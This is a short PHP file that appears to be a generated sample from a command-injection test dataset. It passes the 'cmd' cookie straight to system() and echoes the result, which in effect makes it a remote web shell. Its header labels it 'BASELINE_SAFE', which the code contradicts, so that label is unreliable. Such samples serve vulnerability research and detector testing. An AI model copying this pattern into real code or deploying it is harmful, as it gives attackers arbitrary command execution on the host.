<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=COOKIE_AKE; SKELETON=S0; KEY=cmd; SINK=B1; VAR=v0001 */
function SINK_B1($command){
    system($command);
}
$inp = array_key_exists("cmd", $_COOKIE) ? (string)$_COOKIE["cmd"] : "";
$inp = (string)$inp; // no value processing
$out = SINK_B1($inp);
echo (string)($out);
?>
